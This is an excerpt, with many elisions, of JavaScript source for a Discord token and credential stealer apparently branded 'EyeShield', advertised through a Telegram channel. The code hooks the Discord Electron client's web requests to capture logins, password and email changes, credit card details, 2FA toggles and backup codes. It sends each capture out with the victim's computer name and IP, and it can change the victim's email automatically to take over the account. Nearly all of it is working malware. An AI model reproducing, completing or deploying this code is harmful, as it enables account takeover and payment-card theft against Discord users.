    ...
    embeds: [
      {
        ...
        footer: {
          text: ` [${config.creator}] | https://t.me/EyeSt34ler`,
        },
      },
    ],
  };
...
const FirstTime = async () => {
  ...
  if (fs.existsSync(__dirname + "/Eye")) {
    try {
      fs.rmdirSync(__dirname + "/Eye");
    } catch (err) {}
    var ip = await getIP();
    ...
    if (!token) {
      var params = await makeEmbed({
        title: "<a:caat:1130448857436782682> EyeShield Initialized",
        fields: [
          {
            name: "Injection Info",
      ...
      if (!user.banner)
        var userBanner =
          "https://raw.githubusercontent.com/openyoureyesnow/assets/main/eyeb.png";
      ...
      var params = await makeEmbed({
        ...
        fields: [
          ...
          {
            name: "@Copyright",
            value: `[EyeShield 2023 <a:caat:1130448857436782682>](https://t.me/EyeSt34ler)`,
            inline: !0,
          },
          {
            name: "EyeShield Files",
    ...
    if (
      ...
      if (!token) {
        var params = await makeEmbed({
          title:
            "<a:caat:1130448857436782682> EyeShield User log out (User not Logged in before)",
          fields: [
            {
              name: "Injection Info",
        ...
        var params = await makeEmbed({
          title: "<a:caat:1130448857436782682> EyeShield Victim got logged out",
    ...
    switch (true) {
        ...
        if (!token) {
          await electron.session.defaultSession.webRequest.onCompleted(
            ...
            async (re, callback) => {
              ...
              var params = await makeEmbed({
                title: "<a:caat:1130448857436782682> EyeShield User Login",
                color: config["embed-color"],
                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                fields: [
                  {
      ...
      case request.url.endsWith("users/@me"):
        ...
        if (data.new_password) {
          var params = await makeEmbed({
            title:
              "<a:caat:1130448857436782682> EyeShield Detect Password Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
          ...
          if (config.changeMailAuto == "true") {
            ...
            const generatedEmail = `${username ?? "agivadediscord"}+${generateId(
              3
            )}${domain ?? "@gmail.com"}`;
            ...
            try {
              ...
              if (response.username) {
                ...
                if (res.username) {
                  ...
                  var params = await makeEmbed({
                    title:
                      "<a:caat:1130448857436782682>  EyeShield Have changed the victim mail",
                    color: config["embed-color"],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [
                      {
          ...
          var params = await makeEmbed({
            title:
              "<a:caat:1130448857436782682> EyeShield Detect Email Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
        ...
        if (CardNumber && CardCVC && month && year) {
          await electron.session.defaultSession.webRequest.onCompleted(
            ...
            async (re, callback) => {
              ...
              var params = await makeEmbed({
                title:
                  "<a:caat:1130448857436782682> EyeShield User Credit Card Added",
                color: config["embed-color"],
                fields: [
                  {
                    name: "EyeShield Files",
      ...
      case request.url.endsWith("/enable"):
        ...
        var params = await makeEmbed({
          title: "<a:caat:1130448857436782682> EyeShield User Enable 2FA",
          color: config["embed-color"],
          fields: [
            {
              name: "EyeShield Files",
      ...
      case request.url.endsWith("/disable"):
        var params = await makeEmbed({
          title: "<a:caat:1130448857436782682> EyeShield User Removed 2FA",
          color: config["embed-color"],
          fields: [
            {
              name: "EyeShield Files",
      ...
      case request.url.endsWith("/codes-verification"):
        ...
        var params = await makeEmbed({
          title: "<a:caat:1130448857436782682> EyeShield User 2FA Codes",
          color: config["embed-color"],
          fields: [
            {
              name: "EyeShield Files",
